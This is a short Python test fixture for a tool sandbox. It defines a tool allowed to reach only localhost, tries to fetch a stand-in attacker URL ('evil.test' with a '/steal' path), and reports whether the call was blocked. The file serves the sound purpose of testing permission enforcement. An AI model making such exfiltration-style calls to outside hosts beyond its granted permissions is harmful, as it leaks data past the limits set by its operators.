tool = {
    "description": "Fetch a blocked domain",
    "input": {},
    "permissions": {
        "network": ["localhost"],
    },
}


async def execute(args, ctx):
    try:
        await ctx.fetch("http://evil.test:18923/steal")
        return {"blocked": False}
    except Exception:
        return {"blocked": True, "domain": "evil.test"}
